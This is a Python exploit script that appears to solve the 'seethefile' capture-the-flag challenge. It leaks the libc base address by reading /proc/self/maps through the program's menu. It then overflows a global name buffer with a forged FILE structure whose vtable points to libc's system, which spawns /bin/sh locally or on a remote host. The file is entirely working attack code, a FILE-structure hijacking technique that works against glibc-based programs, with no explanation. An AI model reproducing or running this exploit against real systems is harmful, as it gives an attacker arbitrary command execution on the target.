#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

# context.log_level = 'debug'
exe = context.binary = ELF('./seethefile_patched', checksec=False)
libc = ELF('./libc_32.so.6', checksec=False)

gdbscript = '''
init-pwndbg
# init-gef-bata
brva 0x8048AE0
c
'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            pause()
    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

def menu(choice: int):
    slna(b':', choice)

def openFile(name: bytes):
    menu(1)
    sla(b':', name)

def readFile():
    menu(2)

def writeFile():
    menu(3)
    return ru(b'---------------MENU---------------').split(b'\n')

def exit(name: bytes):
    menu(5)
    sla(b':', name)

# ==================== EXPLOIT ====================
p = start()

openFile(b'/proc/self/maps')
readFile()
readFile()

data = writeFile()
libc.address = int(data[2].split(b' ')[0].split(b'-')[0], 16)
slog('libc base @ %#x', libc.address)

pay = p32(0xFFFFDFFF) + b';/bin/sh;' + (b'A' * (28-9))
pay += p32(exe.symbols['name'])     # fp = name
pay += (b'B' * (10*4)) + p32(0x804b2b0)
pay += p32(exe.symbols['name'] + 0x100)     # fp->_lock = some valid ptr
pay += p32(exe.symbols['name'] + (23-17)*4) # fp->_vtable
pay += p32(libc.symbols['system'])

exit(pay)


interactive(flag=False)
